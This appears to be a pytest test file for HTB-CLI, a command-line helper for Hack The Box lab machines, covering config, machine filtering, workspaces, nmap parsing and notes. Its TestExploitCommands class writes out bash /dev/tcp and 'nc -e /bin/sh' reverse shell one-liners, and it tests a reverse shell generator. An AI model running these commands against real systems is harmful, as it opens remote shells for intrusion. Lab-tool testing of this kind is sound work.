"""
Tests for HTB-CLI
Run with: pytest tests/
"""

import pytest
import json
from pathlib import Path
from htb_cli.core.config_manager import ConfigManager


class TestConfigManager:
    """Test configuration management"""
    
    def test_config_creation(self, tmp_path):
        """Test config file creation"""
        config_dir = tmp_path / ".htb-cli"
        config_file = config_dir / "config.json"
        
        # This would normally use home directory
        # but we'll test the logic
        assert not config_file.exists()
    
    def test_config_set_get(self, tmp_path):
        """Test setting and getting config values"""
        # Create temporary config
        config_dir = tmp_path / ".htb-cli"
        config_dir.mkdir()
        config_file = config_dir / "config.json"
        
        test_config = {"test_key": "test_value"}
        with open(config_file, 'w') as f:
            json.dump(test_config, f)
        
        assert config_file.exists()
    
    def test_nested_config(self):
        """Test nested configuration access"""
        config = {
            "level1": {
                "level2": {
                    "value": "test"
                }
            }
        }
        # Test would verify nested access works
        assert config["level1"]["level2"]["value"] == "test"


class TestUtils:
    """Test utility functions"""
    
    def test_reverse_shell_generation(self):
        """Test reverse shell payload generation"""
        from htb_cli.utils import generate_reverse_shell
        
        ip = "10.10.14.1"
        port = 4444
        
        bash_shell = generate_reverse_shell(ip, port, 'bash')
        assert ip in bash_shell
        assert str(port) in bash_shell
        assert 'bash' in bash_shell.lower() or '/bin/sh' in bash_shell
        
        python_shell = generate_reverse_shell(ip, port, 'python')
        assert ip in python_shell
        assert str(port) in python_shell
        assert 'python' in python_shell.lower()
    
    def test_command_execution(self):
        """Test command execution wrapper"""
        from htb_cli.utils import run_command
        
        returncode, stdout, stderr = run_command("echo 'test'")
        assert returncode == 0
        assert 'test' in stdout


class TestHTBAPI:
    """Test HTB API client"""
    
    def test_api_error_handling(self):
        """Test API error handling"""
        from htb_cli.core.htb_api import HTBAPIError
        
        with pytest.raises(HTBAPIError):
            raise HTBAPIError("Test error")
    
    def test_api_initialization_without_token(self):
        """Test API initialization fails without token"""
        # This would test that API client requires token
        pass


class TestMachineCommands:
    """Test machine management commands"""
    
    def test_machine_filtering(self):
        """Test machine filtering logic"""
        machines = [
            {"name": "Box1", "os": "Linux", "difficultyText": "Easy"},
            {"name": "Box2", "os": "Windows", "difficultyText": "Hard"},
            {"name": "Box3", "os": "Linux", "difficultyText": "Medium"},
        ]
        
        # Filter by OS
        linux_machines = [m for m in machines if m["os"] == "Linux"]
        assert len(linux_machines) == 2
        
        # Filter by difficulty
        easy_machines = [m for m in machines if m["difficultyText"] == "Easy"]
        assert len(easy_machines) == 1


class TestTargetCommands:
    """Test target management commands"""
    
    def test_target_workspace_creation(self, tmp_path):
        """Test workspace directory creation"""
        workspace = tmp_path / "htb" / "test-machine"
        workspace.mkdir(parents=True)
        
        # Create subdirectories
        for subdir in ['scans', 'exploits', 'loot', 'notes']:
            (workspace / subdir).mkdir(exist_ok=True)
        
        assert (workspace / 'scans').exists()
        assert (workspace / 'exploits').exists()
        assert (workspace / 'loot').exists()
        assert (workspace / 'notes').exists()
    
    def test_hosts_file_entry(self):
        """Test hosts file entry format"""
        ip = "10.10.10.10"
        domain = "test.htb"
        entry = f"{ip}  {domain}"
        
        assert ip in entry
        assert domain in entry


class TestScanCommands:
    """Test scanning commands"""
    
    def test_scan_output_parsing(self):
        """Test scan output parsing"""
        # Mock nmap output
        nmap_output = """
        22/tcp open  ssh
        80/tcp open  http
        443/tcp open  https
        """
        
        open_ports = []
        for line in nmap_output.split('\n'):
            if 'open' in line:
                port = line.split('/')[0].strip()
                if port:
                    open_ports.append(int(port))
        
        assert 22 in open_ports
        assert 80 in open_ports
        assert 443 in open_ports


class TestNotesCommands:
    """Test notes management commands"""
    
    def test_notes_template_creation(self, tmp_path):
        """Test notes template creation"""
        notes_file = tmp_path / "test_notes.md"
        
        template = """# Test Machine - HTB Notes
        
## Enumeration
- Port scan results

## Exploitation
- Initial access method

## Privilege Escalation
- Root access method
"""
        
        notes_file.write_text(template)
        assert notes_file.exists()
        assert "Enumeration" in notes_file.read_text()


class TestExploitCommands:
    """Test exploit helper commands"""
    
    def test_shell_payload_formats(self):
        """Test various shell payload formats"""
        ip = "10.10.14.1"
        port = 4444
        
        # Test bash reverse shell format
        bash_shell = f"bash -i >& /dev/tcp/{ip}/{port} 0>&1"
        assert f"/dev/tcp/{ip}/{port}" in bash_shell
        
        # Test nc reverse shell format
        nc_shell = f"nc -e /bin/sh {ip} {port}"
        assert f"{ip} {port}" in nc_shell


# Fixtures
@pytest.fixture
def temp_config_dir(tmp_path):
    """Create temporary config directory"""
    config_dir = tmp_path / ".htb-cli"
    config_dir.mkdir()
    return config_dir


@pytest.fixture
def sample_machine_data():
    """Sample machine data for testing"""
    return {
        "id": 1,
        "name": "TestBox",
        "os": "Linux",
        "difficultyText": "Easy",
        "ip": "10.10.10.10",
        "points": 20,
        "star": 4.5
    }


# Integration tests (require actual HTB API access)
@pytest.mark.integration
class TestIntegration:
    """Integration tests (skip if no API token)"""
    
    def test_full_workflow(self):
        """Test complete workflow"""
        # This would test: init -> list -> start -> scan -> notes
        pytest.skip("Requires API token and active HTB account")


if __name__ == "__main__":
    pytest.main([__file__, "-v"])
